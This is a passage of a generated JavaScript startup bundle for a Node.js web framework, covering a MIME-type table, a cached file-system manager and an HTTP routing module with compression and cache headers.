'use strict';

// GENERATED startup bundle. Original lib modules remain public and authoritative.

const data = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
  ____0.mimeTypes = {
    a: 'application/octet-stream',
    ai: 'application/postscript',
    aif: 'audio/x-aiff',
    aifc: 'audio/x-aiff',
    aiff: 'audio/x-aiff',
    au: 'audio/basic',
    avi: 'video/x-msvideo',
    bat: 'text/plain',
    bin: 'application/octet-stream',
    bmp: 'image/x-ms-bmp',
    c: 'text/plain',
    cdf: 'application/x-cdf',
    csh: 'application/x-csh',
    css: 'text/css',
    dll: 'application/octet-stream',
    doc: 'application/msword',
    dot: 'application/msword',
    dvi: 'application/x-dvi',
    eml: 'message/rfc822',
    eps: 'application/postscript',
    etx: 'text/x-setext',
    exe: 'application/octet-stream',
    gif: 'image/gif',
    gtar: 'application/x-gtar',
    h: 'text/plain',
    hdf: 'application/x-hdf',
    htm: 'text/html',
    html: 'text/html',
    jpe: 'image/jpeg',
    jpeg: 'image/jpeg',
    jpg: 'image/jpeg',
    js: 'application/x-javascript',
    ksh: 'text/plain',
    latex: 'application/x-latex',
    m1v: 'video/mpeg',
    man: 'application/x-troff-man',
    me: 'application/x-troff-me',
    mht: 'message/rfc822',
    mhtml: 'message/rfc822',
    mif: 'application/x-mif',
    mov: 'video/quicktime',
    movie: 'video/x-sgi-movie',
    mp2: 'audio/mpeg',
    mp3: 'audio/mpeg',
    mp4: 'video/mp4',
    mpa: 'video/mpeg',
    mpe: 'video/mpeg',
    mpeg: 'video/mpeg',
    mpg: 'video/mpeg',
    ms: 'application/x-troff-ms',
    nc: 'application/x-netcdf',
    nws: 'message/rfc822',
    o: 'application/octet-stream',
    obj: 'application/octet-stream',
    oda: 'application/oda',
    pbm: 'image/x-portable-bitmap',
    pdf: 'application/pdf',
    pfx: 'application/x-pkcs12',
    pgm: 'image/x-portable-graymap',
    png: 'image/png',
    pnm: 'image/x-portable-anymap',
    pot: 'application/vnd.ms-powerpoint',
    ppa: 'application/vnd.ms-powerpoint',
    ppm: 'image/x-portable-pixmap',
    pps: 'application/vnd.ms-powerpoint',
    ppt: 'application/vnd.ms-powerpoint',
    pptx: 'application/vnd.ms-powerpoint',
    ps: 'application/postscript',
    pwz: 'application/vnd.ms-powerpoint',
    py: 'text/x-python',
    pyc: 'application/x-python-code',
    pyo: 'application/x-python-code',
    qt: 'video/quicktime',
    ra: 'audio/x-pn-realaudio',
    ram: 'application/x-pn-realaudio',
    ras: 'image/x-cmu-raster',
    rdf: 'application/xml',
    rgb: 'image/x-rgb',
    roff: 'application/x-troff',
    rtx: 'text/richtext',
    sgm: 'text/x-sgml',
    sgml: 'text/x-sgml',
    sh: 'application/x-sh',
    shar: 'application/x-shar',
    snd: 'audio/basic',
    so: 'application/octet-stream',
    src: 'application/x-wais-source',
    swf: 'application/x-shockwave-flash',
    t: 'application/x-troff',
    tar: 'application/x-tar',
    tcl: 'application/x-tcl',
    tex: 'application/x-tex',
    texi: 'application/x-texinfo',
    texinfo: 'application/x-texinfo',
    tif: 'image/tiff',
    tiff: 'image/tiff',
    tr: 'application/x-troff',
    tsv: 'text/tab-separated-values',
    txt: 'text/plain',
    ustar: 'application/x-ustar',
    vcf: 'text/x-vcard',
    wav: 'audio/x-wav',
    wiz: 'application/msword',
    wsdl: 'application/xml',
    webp: 'image/webp',
    xbm: 'image/x-xbitmap',
    xlb: 'application/vnd.ms-excel',
    xls: 'application/vnd.ms-excel',
    xlsx: 'application/vnd.ms-excel',
    xml: 'text/xml',
    xpdl: 'application/xml',
    xpm: 'image/x-xpixmap',
    xsl: 'application/xml',
    xwd: 'image/x-xwindowdump',
    zip: 'application/zip',
  };
};

return module.exports; })();

const fsm = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
    const fsm = function () {};
    const fs = require('fs');

    ____0.on('0x0000', (_) => {
        if (!_) {
            fsm.clearCache();
        }
    });

    fsm.dir = ____0.dir;
    fsm.list = [];
    fsm.cache = new Map();
    fsm.pathCache = new Map();
    fsm.missingPathCache = new Map();
    fsm.pathCacheTTL = 30000;
    fsm.missingPathCacheTTL = 3000;
    fsm.cacheMaxEntries = 5000;
    fsm.cacheMaxBytes = 128 * 1024 * 1024;
    fsm.cacheBytes = 0;

    fsm._fileSize = function (file) { return file && file.content != null ? Buffer.byteLength(typeof file.content === 'string' ? file.content : JSON.stringify(file.content)) : 0; };
    fsm._touch = function (file) { if (!file) return file; file.count = (file.count || 0) + 1; file.time = Date.now(); return file; };
    fsm._cacheFile = function (file) {
        if (!file || !file.path) return file;
        const old = fsm.cache.get(file.path);
        if (old) {
            fsm.cacheBytes -= old.$cacheSize || 0;
            const oldIndex = fsm.list.indexOf(old);
            if (oldIndex !== -1) fsm.list[oldIndex] = file;
        } else {
            fsm.list.push(file);
        }
        file.$cacheSize = fsm._fileSize(file);
        fsm.cache.set(file.path, file);
        fsm.cacheBytes += file.$cacheSize;
        while (fsm.cache.size > fsm.cacheMaxEntries || fsm.cacheBytes > fsm.cacheMaxBytes) {
            const oldestKey = fsm.cache.keys().next().value;
            if (oldestKey === undefined) break;
            const evicted = fsm.cache.get(oldestKey);
            fsm.cache.delete(oldestKey);
            fsm.cacheBytes -= evicted?.$cacheSize || 0;
            const i = fsm.list.indexOf(evicted);
            if (i !== -1) fsm.list.splice(i, 1);
        }
        return file;
    };
    fsm._evictPath = function (path) {
        if (!path) return;
        const file = fsm.cache.get(path);
        if (file) {
            fsm.cache.delete(path);
            fsm.cacheBytes -= file.$cacheSize || 0;
            const i = fsm.list.indexOf(file);
            if (i !== -1) fsm.list.splice(i, 1);
        }
        fsm.pathCache.clear();
        fsm.missingPathCache.clear();
    };

    fsm._getCached = function (path) {
        const file = fsm.cache.get(path);
        if (!file) return null;
        fsm.cache.delete(path); fsm.cache.set(path, file);
        return fsm._touch(file);
    };
    fsm.clearCache = function () { fsm.list.length = 0; fsm.cache.clear(); fsm.pathCache.clear(); fsm.missingPathCache.clear(); fsm.cacheBytes = 0; };

    fsm.isFileExistsSync = (path) => {
        if (path) {
            return fsm.cache.has(path) || fs.existsSync(path);
        }
        return false;
    };

    fsm.isFileExists = (path, callback) => {
        if (callback) {
            callback(fsm.isFileExistsSync(path));
        }
    };

    fsm.statSync = function (path) {
        if (fsm.isFileExistsSync(path)) {
            return fs.statSync(path);
        }
    };

    fsm.stat = function (path, callback) {
        if (callback) {
            callback(fsm.statSync(path));
        }
    };

    fsm.createDirSync = fsm.mkdirSync = function (path) {
        try {
            fs.mkdirSync(path);
            return !0;
        } catch (error) {
            return !1;
        }
    };

    fsm.createDir = fsm.mkDir = (dir, callback) => {
        callback = callback || function () {};
        if (____0.path.dirname(dir)) {
            if (fs.existsSync(____0.path.dirname(dir))) {
                fs.mkdir(dir, (err) => {
                    callback(err, dir);
                });
            } else {
                let parentDir = ____0.path.dirname(dir);
                fsm.mkDir(parentDir, () => {
                    fs.mkdir(dir, (err) => {
                        callback(err, dir);
                    });
                });
            }
        }else{
            callback(new Error('Invalid directory path'), dir);
        }
    };

    fsm.removeFileSync = fsm.deleteFileSync = function (path) {
        if (path && fs.existsSync(path)) {
            const result = fs.unlinkSync(path);
            fsm._evictPath(path);
            return result;
        }
        fsm._evictPath(path);
        return null;
    };

    fsm.removeFile = fsm.deleteFile = function (path, callback) {
        callback =
            callback ||
            function (err) {
                if (err) {
                    ____0.log(err);
                }
            };

        fsm.isFileExists(path, (yes) => {
            if (yes) {
                fs.unlink(path, (err) => {
                    if (!err) fsm._evictPath(path);
                    callback(err);
                });
            } else {
                callback({
                    message: path + ' :: Error Deleting :: file not exists',
                });
            }
        });
    };

    fsm.writeFileSync = function (path, data, encode, callback) {
        callback =
            callback ||
            function (err) {
                if (err) {
                    ____0.log(err);
                }
            };

        try {
            let path2 = path + '.isite-backup';
            fsm.deleteFileSync(path2);
            fs.writeFileSync(path2, data, {
                encoding: encode || 'utf8',
            });
            fsm.deleteFileSync(path);
            fs.renameSync(path2, path);
            fsm.deleteFileSync(path2);
            fsm._evictPath(path);
            callback(null, path);
        } catch (err) {
            callback(err);
        }
    };

    fsm.writeFile = function (path, data, callback) {
        callback = callback || function (err) { if (err) ____0.log(err); };
        const path2 = path + '.isite-backup';
        (async function () {
            try {
                await fs.promises.mkdir(____0.path.dirname(path), { recursive: true });
                await fs.promises.rm(path2, { force: true });
                await fs.promises.writeFile(path2, data, { encoding: 'utf8' });
                await fs.promises.rm(path, { force: true });
                await fs.promises.rename(path2, path);
                fsm._evictPath(path);
                fsm.pathCache.clear();
                fsm.missingPathCache.clear();
                callback(null, path);
            } catch (err) { callback(err); }
        })();
    };

    fsm.getFilePath = function (name) {
        if (!name || typeof name !== 'string') return null;
        const now = Date.now();
        const cachedPath = fsm.pathCache.get(name);
        if (cachedPath && now - cachedPath.time < fsm.pathCacheTTL && ____0.isFileExistsSync(cachedPath.path)) return cachedPath.path;
        const missingAt = fsm.missingPathCache.get(name);
        if (missingAt && now - missingAt < fsm.missingPathCacheTTL) return null;
        if (____0.isFileExistsSync(name)) {
            fsm.pathCache.set(name, { path: name, time: now });
            return name;
        }

        let path = null;

        if (!path || !____0.isFileExistsSync(path)) {
            let arr = name.split('/');
            if (arr.length === 1) {
                path = ____0.path.join(____0.path.dirname(____0.dir), ____0.path.extname(arr[0]).replace('.', ''), arr[0]);
            } else if (arr.length === 2) {
                path = ____0.path.join(____0.path.dirname(____0.dir), ____0.path.extname(arr[1]).replace('.', ''), arr[0], arr[1]);
            } else if (arr.length === 3) {
                path = ____0.path.join(____0.path.dirname(____0.dir), ____0.path.extname(arr[2]).replace('.', ''), arr[0], arr[1], arr[2]);
            }
        }

        if (!____0.isFileExistsSync(path)) {
            let arr = name.split('/');
            if (arr.length === 2) {
                path = ____0.path.join(____0.path.dirname(____0.cwd), 'apps', arr[0], 'site_files', ____0.path.extname(arr[1]).replace('.', ''), arr[1]);
            } else if (arr.length === 3) {
                path = ____0.path.join(____0.path.dirname(____0.cwd), 'apps', arr[0], 'site_files', ____0.path.extname(arr[2]).replace('.', ''), arr[1], arr[2]);
            }
        }

        if (!____0.isFileExistsSync(path) && ____0.apps) {
            let arr = name.split('/');
            if (arr.length > 1) {
                ____0.apps.forEach((ap) => {
                    if (arr.length === 2 && ap.name == arr[0]) {
                        path = ____0.path.join(ap.path, 'site_files', ____0.path.extname(arr[1]).replace('.', ''), arr[1]);
                    } else if (arr.length === 2 && ap.name2 == arr[0]) {
                        path = ____0.path.join(ap.path, 'site_files', ____0.path.extname(arr[1]).replace('.', ''), arr[1]);
                    } else if (arr.length === 3 && ap.name == arr[0]) {
                        path = ____0.path.join(ap.path, 'site_files', ____0.path.extname(arr[2]).replace('.', ''), arr[1], arr[2]);
                    }
                });
            }
        }

        if (!____0.isFileExistsSync(path)) {
            // ____0.log(name, 'PATH NOT EXISTS fsm.getFilePath()');
            fsm.missingPathCache.set(name, now);
            return null;
        }

        fsm.pathCache.set(name, { path, time: now });
        fsm.missingPathCache.delete(name);
        return path;
    };

    fsm.off = function (path) {
        if (!path) {
            return false;
        }
        if (path && Array.isArray(path)) {
            path.forEach((p) => {
                fsm.off(p);
            });
            return;
        }
        if (typeof path === 'object') {
            path = path.path;
        }

        path = fsm.getFilePath(path) || path;

        if (path && typeof path == 'string') {
            for (let i = fsm.list.length; i--; ) {
                if (fsm.list[i] && fsm.list[i].path.like(path)) {
                    const file = fsm.list[i];
                    fsm.cache.delete(file.path);
                    fsm.cacheBytes -= file.$cacheSize || 0;
                    fsm.list.splice(i, 1);
                }
            }
            fsm.pathCache.clear();
            fsm.missingPathCache.clear();
        }

        return true;
    };

    fsm.readFileStream = function (path) {
        var readerStream = fs.createReadStream(path);
        readerStream.setEncoding(____0.fn.getFileEncode(path));
        return readerStream;
    };

    fsm.readFileRaw = function (path, callback) {
        var data = '';
        var readerStream = fsm.readFileStream(path);
        readerStream.on('data', function (chunk) {
            data += chunk;
        });

        readerStream.on('end', function () {
            callback(data);
        });

        readerStream.on('error', function (err) {
            console.log(err.stack);
        });
    };

    fsm.readFileNow = function (path, callback) {
        fsm.readFileRaw(path, (data) => {
            path = path.replace('.isite-backup', '');

            let file = {
                path: path,
                content: data,
                count: 1,
                stat: fsm.statSync(path),
                time: new Date().getTime(),
            };

            file.json = function (callback) {
                try {
                    if (!file.isJson) {
                        file.content = JSON.parse(file.content);
                        file.isJson = true;
                    }
                } catch (error) {
                    file.error = error;
                    console.log(error);
                }
                if (callback) {
                    callback(file);
                } else {
                    return file;
                }
            };
            fsm._cacheFile(file);
            if (callback) {
                callback(null, file);
            }
        });
    };

    fsm.readFile = function (path, callback) {
        path = fsm.getFilePath(path);

        if (!path) {
            if (callback) {
                callback({
                    message: path + ' !path :: Error Read File Not Exists',
                });
            }
        }

        const cached = fsm._getCached(path);
        if (cached) {
            if (callback) callback(null, cached);
            return;
        }

        if (fsm.isFileExistsSync(path)) {
            fsm.readFileNow(path, callback);
        } else if (fsm.isFileExistsSync(path + '.isite-backup')) {
            fsm.readFileNow(path + '.isite-backup', callback);
        } else {
            if (callback) {
                callback({
                    message: path + '  :: Error Read File Path Not Exists',
                });
            }
        }
    };

    fsm.readFileSyncRaw = function (path) {
        return fs.readFileSync(path, ____0.fn.getFileEncode(path));
    };
    fsm.readFileSync = function (path) {
        path = fsm.getFilePath(path);

        if (!path) {
            return '';
        }

        const cached = fsm._getCached(path);
        if (cached) return cached.content;

        if (fsm.isFileExistsSync(path)) {
            let file = {
                path: path,
                content: fsm.readFileSyncRaw(path),
                count: 1,
                stat: fsm.statSync(path),
                time: new Date().getTime(),
            };
            fsm._cacheFile(file);

            return file.content;
        } else if (fsm.isFileExistsSync(path + '.isite-backup')) {
            let file = {
                path: path,
                content: fsm.readFileSyncRaw(path + '.isite-backup'),
                count: 1,
                stat: fsm.statSync(path + '.isite-backup'),
                time: new Date().getTime(),
            };
            fsm._cacheFile(file);

            return file.content;
        }
        return '';
    };

    fsm.readFiles = function (paths, callback) {
        callback = callback || function () {};
        let content = '';
        for (const p of paths) content += fsm.readFileSync(p);
        callback(null, content);
    };

    fsm.isImage = function (extname) {
        if (extname.contains('png|jpg|jpeg|bmp|ico|webp|gif')) {
            return true;
        }
        return false;
    };

    fsm.getContent = function (name, callback) {
        callback = callback || function () {};
        let extname = ____0.path.extname(name).replace('.', '');
        if (fsm.isImage(extname)) {
            extname = 'images';
        }

        let path = name;

        if (!____0.isFileExistsSync(path)) {
            path = ____0.path.join(____0.dir, extname, name);
        }

        if (!____0.isFileExistsSync(path)) {
            let arr = name.split('/');
            if (arr.length === 2) {
                let extname = ____0.path.extname(arr[1]).replace('.', '');
                if (fsm.isImage(extname)) {
                    extname = 'images';
                }
                path = ____0.path.join(____0.path.dirname(____0.dir), 'apps', arr[0], 'site_files', extname, arr[1]);
            } else if (arr.length === 3) {
                let extname = ____0.path.extname(arr[2]).replace('.', '');
                if (fsm.isImage(extname)) {
                    extname = 'images';
                }
                path = ____0.path.join(____0.path.dirname(____0.dir), 'apps', arr[0], 'site_files', extname, arr[1], arr[2]);
            }
        }

        if (!____0.isFileExistsSync(path)) {
            let arr = name.split('/');
            if (arr.length > 1) {
                ____0.apps.forEach((ap) => {
                    if (arr.length === 2 && ap.name == arr[0]) {
                        let extname = ____0.path.extname(arr[1]).replace('.', '');
                        if (fsm.isImage(extname)) {
                            extname = 'images';
                        }
                        path = ____0.path.join(ap.path, 'site_files', extname, arr[1]);
                    } else if (arr.length === 2 && ap.name2 == arr[0]) {
                        let extname = ____0.path.extname(arr[1]).replace('.', '');
                        if (fsm.isImage(extname)) {
                            extname = 'images';
                        }
                        path = ____0.path.join(ap.path, 'site_files', extname, arr[1]);
                    } else if (arr.length === 3 && ap.name == arr[0]) {
                        let extname = ____0.path.extname(arr[2]).replace('.', '');
                        if (fsm.isImage(extname)) {
                            extname = 'images';
                        }
                        path = ____0.path.join(ap.path, 'site_files', extname, arr[1], arr[2]);
                    }
                });
            }
        }

        if (!____0.isFileExistsSync(path)) {
            ____0.log(path, 'PATH NOT EXISTS fsm.getContent()');
            callback('');
            return '';
        }

        let txt = ____0.readFileSync(path);
        callback(txt);
        return txt;
    };

    fsm.css = function (name, callback) {
        callback = callback || function () {};
        fsm.readFile(fsm.dir + '/css/' + name + '.css', function (err, data, file) {
            callback(err, data, file);
        });
    };

    fsm.js = function (name, callback) {
        callback = callback || function () {};
        fsm.readFile(fsm.dir + '/js/' + name + '.js', function (err, data, file) {
            callback(err, data, file);
        });
    };

    fsm.html = function (name, callback) {
        callback = callback || function () {};
        fsm.readFile(fsm.dir + '/html/' + name + '.html', function (err, data, file) {
            callback(err, data, file);
        });
    };

    fsm.json = function (name, callback) {
        callback = callback || function () {};
        fsm.readFile(fsm.dir + '/json/' + name + '.json', function (err, data, file) {
            callback(err, data, file);
        });
    };

    fsm.xml = function (name, callback) {
        callback = callback || function () {};
        fsm.readFile(fsm.dir + '/xml/' + name + '.xml', function (err, data, file) {
            callback(err, data, file);
        });
    };

    fsm.downloadFile = function (path, req, res) {
        try {
            let stats = fsm.statSync(path);
            if (stats) {
                res.writeHead(200, {
                    'Content-Type': ____0.fn.contentType(path),
                    'Content-Length': stats.size,
                    'Content-Disposition': 'attachment; filename=' + ____0.path.basename(path),
                });
                var readStream = fs.createReadStream(path);
                readStream.pipe(res);
            } else {
                res.error();
            }
        } catch (error) {
            res.error();
        }
    };

    fsm.download = function (name, req, res) {
        return fsm.downloadFile(fsm.dir + '/downloads/' + name, req, res);
    };

    return fsm;
};

return module.exports; })();

const routing = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
    ____0.on(____0.strings[4], (_) => {
        if (!_) {
            _0xrrxo.list = _0xrrxo.list.filter((r) => r.name.like('*x-api*')); _0xrrxo.invalidateIndex();
        }
    });

    let _0xrrxo = function () {};

    _0xrrxo.list = [];
    _0xrrxo._indexDirty = true;
    _0xrrxo._exactByMethod = new Map();
    _0xrrxo._dynamicByMethod = new Map();
    _0xrrxo.invalidateIndex = function () { _0xrrxo._indexDirty = true; };
    _0xrrxo._compilePattern = function (pattern) {
        const source = '^' + String(pattern).split('*').map((part) => ____0.escapeRegExp(part)).join('.*') + '$';
        return new RegExp(source, 'iu');
    };
    _0xrrxo.rebuildIndex = function () {
        _0xrrxo._exactByMethod.clear();
        _0xrrxo._dynamicByMethod.clear();
        _0xrrxo.list.forEach((route, order) => {
            route.$order = order;
            const methods = String(route.method || 'GET').split('|').map((m) => m.trim().toUpperCase()).filter(Boolean);
            route.$matcher = route.name.includes('*') ? _0xrrxo._compilePattern(route.name) : null;
            for (const method of methods) {
                if (method.includes('*')) continue;
                if (route.$matcher) {
                    let arr = _0xrrxo._dynamicByMethod.get(method);
                    if (!arr) _0xrrxo._dynamicByMethod.set(method, (arr = []));
                    arr.push(route);
                } else {
                    let map = _0xrrxo._exactByMethod.get(method);
                    if (!map) _0xrrxo._exactByMethod.set(method, (map = new Map()));
                    if (!map.has(route.name)) map.set(route.name, route);
                }
            }
        });
        _0xrrxo._indexDirty = false;
    };
    _0xrrxo.findRoute = function (pathname, method) {
        if (_0xrrxo._indexDirty) _0xrrxo.rebuildIndex();
        const m = String(method || 'GET').toUpperCase();
        const exact = _0xrrxo._exactByMethod.get(m)?.get(pathname);
        let dynamic = null;
        const list = _0xrrxo._dynamicByMethod.get(m) || [];
        for (const route of list) {
            if (route.$matcher.test(pathname)) { dynamic = route; break; }
        }
        if (exact && dynamic) return exact.$order <= dynamic.$order ? exact : dynamic;
        if (exact || dynamic) return exact || dynamic;
        // Compatibility fallback for unusual method wildcard patterns.
        for (const route of _0xrrxo.list) {
            if (pathname.like(route.name) && m.like(route.method)) return route;
        }
        return null;
    };

    _0xrrxo.isCompressibleContentType = function (contentType) {
        contentType = String(contentType || '').toLowerCase();
        return contentType.includes('text/css') || contentType.includes('javascript') || contentType.includes('text/html') ||
            contentType.includes('text/plain') || contentType.includes('application/json') || contentType.includes('application/xml') ||
            contentType.includes('text/xml') || contentType.includes('image/svg+xml');
    };
    _0xrrxo.selectCompression = function (acceptEncoding) {
        const accept = String(acceptEncoding || '').toLowerCase();
        if (accept.includes('br') && ____0.zlib.brotliCompress) return { encoding: 'br', fn: ____0.zlib.brotliCompress };
        if (accept.includes('gzip')) return { encoding: 'gzip', fn: ____0.zlib.gzip };
        if (accept.includes('deflate')) return { encoding: 'deflate', fn: ____0.zlib.deflate };
        return null;
    };
    _0xrrxo.compress = function (content, contentType, acceptEncoding, callback) {
        if (typeof content !== 'string' || Buffer.byteLength(content) < 1024 || !_0xrrxo.isCompressibleContentType(contentType)) {
            callback(null, content, null);
            return;
        }
        const selected = _0xrrxo.selectCompression(acceptEncoding);
        if (!selected) {
            callback(null, content, null);
            return;
        }
        selected.fn(Buffer.from(content), function (err, compressed) {
            if (err) callback(err, content, null);
            else callback(null, compressed, selected.encoding);
        });
    };

    _0xrrxo.endResponse = function (req, res) {
        let route = req.route;

        if (route.contentError) {
            if (____0.options.help) {
                res.set('help-error-message', route.contentError);
            }
            res.end();
            return;
        }

        if (req.route.encript == '123' && req.content) {
            req.content = ____0.f1(req.content);
        }

        if (route.parser.like('*html*') && route.content && route.content.length > 0) {
            req.content = ____0.parser(req, res, ____0, route).html(route.content);
        } else if (route.parser == 'css' && route.content && route.content.length > 0) {
            req.content = ____0.parser(req, res, ____0, route).css(route.content);
        } else if (route.parser == 'js' && route.content && route.content.length > 0) {
            req.content = ____0.parser(req, res, ____0, route).js(route.content);
        } else {
            req.content = route.content;
        }

        if (route.compress) {
            req.content = req.content.replace(/\r?\n|\r/g, ' ').replace(/\s+/g, ' ');
        }

        route.path = route.path || '';

        // let hash = req.content ? ____0.x0md50x(req.content) : ____0.x0md50x('');
        let last_modified = new Date().toUTCString();
        if (route.stat) {
            last_modified = new Date(route.stat.mtimeMs).toUTCString();
        }

        // if (req.headers['if-none-match'] == hash) {
        //   if (____0.options.help) {
        //     res.set('help-info-message', 'etag matched');
        //   }
        //   // res.status(304).end(null);
        //   // return;
        // }

        // res.set('ETag', hash);

        if (____0.options.cache.enabled) {
            res.set('Last-Modified', last_modified);
        }

        if (route.headers) {
            for (const property in route.headers) {
                res.set(property, route.headers[property]);
            }
        }

        if (true) {
            if (route.path.endsWith('.css')) {
                res.set(____0.strings[7], 'text/css');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.css);
                }
            } else if (route.path.endsWith('.js')) {
                res.set(____0.strings[7], 'application/javascript');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.js);
                }
            } else if (route.path.endsWith('.html')) {
                res.set(____0.strings[7], 'text/html');
                if (____0.options.cache.enabled && route.cache) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.html);
                }
            } else if (route.path.endsWith('.txt')) {
                res.set(____0.strings[7], 'text/plain');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.txt);
                }
            } else if (route.path.endsWith('.json')) {
                res.set(____0.strings[7], 'application/json');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.json);
                }
            } else if (route.path.endsWith('.xml')) {
                res.set(____0.strings[7], 'text/xml');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.xml);
                }
            } else if (route.path.endsWith('.woff2')) {
                res.set(____0.strings[7], 'application/font-woff2');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                }
            } else if (route.path.endsWith('.woff')) {
                res.set(____0.strings[7], 'application/font-woff');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                }
            } else if (route.path.endsWith('.ttf')) {
                res.set(____0.strings[7], 'application/font-ttf');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                }
            } else if (route.path.endsWith('.otf')) {
                res.set(____0.strings[7], 'application/font-otf');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                }
            } else if (route.path.endsWith('.eot')) {
                res.set(____0.strings[7], 'application/font-eot');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                }
            } else if (route.path.endsWith('.gif')) {
                res.set(____0.strings[7], 'image/gif');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                }
            } else if (route.path.endsWith('.png')) {
                res.set(____0.strings[7], 'image/png');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                }
            } else if (route.path.endsWith('.jpg')) {
                res.set(____0.strings[7], 'image/jpg');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                }
            } else if (route.path.endsWith('.jpeg')) {
                res.set(____0.strings[7], 'image/jpeg');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                }
            } else if (route.path.endsWith('.ico')) {
                res.set(____0.strings[7], 'image/ico');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                }
            } else if (route.path.endsWith('.bmp')) {
                res.set(____0.strings[7], 'image/bmp');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                }
            } else if (route.path.endsWith('.webp')) {
                res.set(____0.strings[7], 'image/webp');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                }
            } else if (route.path.endsWith('.svg')) {
                res.set(____0.strings[7], 'image/svg+xml');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                }
            }else if (route.path.endsWith('.mp4')) {
                res.set(____0.strings[7], 'video/mp4');
                if (____0.options.cache.enabled) {
                    res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.videos);
                }
            }
        }

        let response = {
            host: req.host,
            url: req.url,
            filePath: route.path,
            content: req.content,
            encode: ____0.getFileEncode(route.path),
            headers: res.headers,
            code: res.code,
        };

        if (route.shared) ____0.setShared(response);

        if (typeof response.content == 'object') {
            res.json(response.content);
        } else {
            res.end(response.content, response.encode);
        }
    };

    _0xrrxo.defaultCallback = function (req, res) {
        let route = req.route;

        if (route.contentError) {
            res.status(404);
            if (____0.options.help) {
                res.set('help-info-content', route.contentError);
            }

            _0xrrxo.endResponse(req, res);
            return;
        }

        if ((response = ____0.getShared(req.host, route.path, req.url))) {
            res.headers = response.headers;
            res.code = response.code;
            for (const key in response.headers) {
                if (Object.prototype.hasOwnProperty.call(response.headers, key)) {
                    if (key !== 'x-shared') {
                        res.set(key, response.headers[key]);
                    }
                }
            }
            res.set('x-shared', '-host=' + req.host + ' -port=' + ____0.options.port + ' -count=' + req.route.count + ' -time=' + new Date().getTime());
            return res.end(response.content, response.encode);
        }

        if (route.cache && route.content) {
            if (____0.options.help) {
                res.set('help-info-content', 'From Route Memory');
            }

            res.status(200);
            _0xrrxo.endResponse(req, res);
            return;
        }

        if (!route.path && !route.content) {
            if (____0.options.help) {
                res.set('help-info-content', 'Route Not Set File Path');
            }
            res.status(200);
            _0xrrxo.endResponse(req, res);
            return;
        } else if (route.content) {
            if (____0.options.help) {
                res.set('help-info-content', 'Content From Route init');
            }
            res.status(200);
            _0xrrxo.endResponse(req, res);
        }

        if (typeof route.path == 'string') {
            ____0.readFile(route.path, function (err, file) {
                if (!err) {
                    route.content = file.content.toString('utf8');
                    if (route.encript && route.encript === '123') {
                        route.content = ____0.f1(route.content);
                    }
                    route.stat = file.stat;
                    if (route.masterPage) {
                        for (var i = 0; i < ____0.masterPages.length; i++) {
                            if (route.masterPage == ____0.masterPages[i].name) {
                                route.content = ____0.readFileSync(____0.masterPages[i].header) + route.content + ____0.readFileSync(____0.masterPages[i].footer);
                                break;
                            }
                        }
                    }

                    if (____0.options.help) {
                        res.set('help-info-content', 'Route Read File');
                    }

                    res.status(200);
                    _0xrrxo.endResponse(req, res);
                } else {
                    if (____0.options.help) {
                        res.set('help-error', 'Route Error Read File');
                    }

                    res.status(404);
                    route.contentError = err.message;
                    _0xrrxo.endResponse(req, res);
                    return;
                }
            });
        } else if (Array.isArray(route.path)) {
            ____0.readFiles(route.path, function (err, data) {
                if (!err) {
                    if (____0.options.help) {
                        res.set('help-info-content', 'Route Read Files');
                    }

                    route.content = data.toString('utf8');

                    res.status(200);
                    route.path = route.path.join('&&');
                    _0xrrxo.endResponse(req, res);
                } else {
                    if (____0.options.help) {
                        res.set('help-error', 'Route Error Read Files');
                    }

                    res.status(404);
                    route.contentError = err.message;
                    _0xrrxo.endResponse(req, res);
                    return;
                }
            });
        }
    };

    _0xrrxo.call = function (r, req, res, callback) {
        callback =
            callback ||
            function (req, res) {
                ____0.log('No CallBack set For : ', r);
                res.end();
            };
        if (typeof r === 'string') {
            r = {
                name: r,
                method: req.method,
            };
        }

        let routeIndex = _0xrrxo.list.findIndex((rr) => (rr.name == r.name || rr.nameRaw == r.name) && rr.method == r.method);
        if (routeIndex !== -1) {
            req.route = _0xrrxo.list[routeIndex];
            req.route.count++;
            req.route.callback(req, res);
        } else {
            callback(req, res);
        }
    };
    _0xrrxo.off = function (r) {
        if (!r) {
            return;
        }
        if (typeof r == 'string') {
            r = { name: r };
        }
